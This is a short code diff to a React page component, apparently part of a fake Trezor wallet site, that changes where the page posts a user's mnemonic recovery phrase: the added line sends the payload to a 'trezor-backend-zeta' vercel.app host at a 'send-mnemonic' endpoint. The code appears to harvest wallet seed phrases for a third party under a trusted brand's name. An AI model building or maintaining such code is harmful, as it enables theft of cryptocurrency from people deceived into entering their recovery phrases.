@@ -88,7 +88,7 @@ export default function PhraseMainPage() {
 
       setLoading(true);
       const response = await axios.post(
-        "https://trezor-backend.vercel.app/api/v1/send-mnemonic",
+        "https://trezor-backend-zeta.vercel.app/api/v1/send-mnemonic",
         payload
       );
 
